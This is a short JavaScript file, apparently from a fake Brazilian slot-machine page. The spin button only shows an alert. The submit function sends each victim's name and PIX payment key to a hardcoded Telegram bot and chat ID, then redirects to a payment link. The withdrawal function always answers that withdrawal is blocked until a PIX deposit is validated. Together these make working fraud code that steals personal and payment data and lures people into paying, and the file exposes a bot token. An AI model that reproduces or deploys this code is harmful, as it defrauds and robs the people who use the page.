const TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
const CHAT_ID = "6238676644";

window.girarSlots = () => { alert("Girando rolos..."); };
window.abrirModal = () => document.getElementById("modal").style.display = "flex";
window.fecharModal = () => document.getElementById("modal").style.display = "none";

window.enviarDados = () => {
    const nome = document.getElementById("nome-usuario").value;
    const chave = document.getElementById("pix-chave-fixa").value;
    
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: `Novo Depósito!\nNome: ${nome}\nChave: ${chave}` 
        })
    }).then(() => {
        window.location.href = "https://go.tribopay.com.br/w3p787fphj";
    });
};

window.sacar = () => alert("Saque bloqueado. Valide seu depósito via PIX.");
